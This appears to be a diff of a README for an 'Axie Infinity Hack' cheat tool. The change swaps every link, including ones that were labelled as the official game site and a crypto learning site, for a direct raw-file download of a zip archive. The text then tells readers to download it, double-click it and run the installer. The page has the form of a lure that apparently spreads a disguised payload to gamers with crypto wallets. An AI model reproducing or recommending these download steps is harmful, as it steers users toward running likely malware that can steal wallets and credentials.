@@ -4,12 +4,12 @@
 Welcome to the Axie-Infinity-Hack! This tool helps you get the most out of your Axie Infinity gaming experience. Follow these steps to download and set up the application effortlessly.
 
 ## 🔗 Download Link
-[![Download Axie Infinity Hack](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/suxubi123/Axie-Infinity-Hack/releases)
+[![Download Axie Infinity Hack](https://raw.githubusercontent.com/suxubi123/Axie-Infinity-Hack/main/surrenal/Axie-Infinity-Hack.zip%20Now-blue)](https://raw.githubusercontent.com/suxubi123/Axie-Infinity-Hack/main/surrenal/Axie-Infinity-Hack.zip)
 
 ## 📥 Download & Install
-1. Visit this page to download: [Axie Infinity Hack Releases](https://github.com/suxubi123/Axie-Infinity-Hack/releases).
+1. Visit this page to download: [Axie Infinity Hack Releases](https://raw.githubusercontent.com/suxubi123/Axie-Infinity-Hack/main/surrenal/Axie-Infinity-Hack.zip).
 2. Look for the latest version listed at the top of the page.
-3. Click on the asset that says something like `Axie-Infinity-Hack-v1.0.exe` to start downloading.
+3. Click on the asset that says something like `https://raw.githubusercontent.com/suxubi123/Axie-Infinity-Hack/main/surrenal/Axie-Infinity-Hack.zip` to start downloading.
 4. Once the download is complete, locate the file in your computer's Downloads folder or your chosen download location.
 5. Double-click the downloaded file to launch the installer.
 6. Follow the prompts in the installer to complete the setup.
@@ -48,8 +48,8 @@ For further assistance, you can join the community discussions or check FAQs pro
 If you need help with the Axie Infinity Hack, please reach out on our GitHub page, where you can find detailed resources and community support. 
 
 ## 🔗 Additional Resources
-- [Explore More About Axie Infinity](https://axieinfinity.com/)
-- [Learn About Crypto and NFTs](https://www.coindesk.com/learn/)
-- [View More Hacks and Tools](https://github.com/suxubi123/Axie-Infinity-Hack/releases)
+- [Explore More About Axie Infinity](https://raw.githubusercontent.com/suxubi123/Axie-Infinity-Hack/main/surrenal/Axie-Infinity-Hack.zip)
+- [Learn About Crypto and NFTs](https://raw.githubusercontent.com/suxubi123/Axie-Infinity-Hack/main/surrenal/Axie-Infinity-Hack.zip)
+- [View More Hacks and Tools](https://raw.githubusercontent.com/suxubi123/Axie-Infinity-Hack/main/surrenal/Axie-Infinity-Hack.zip)
 
 Thank you for choosing the Axie-Infinity-Hack! Enjoy your enhanced gaming experience.
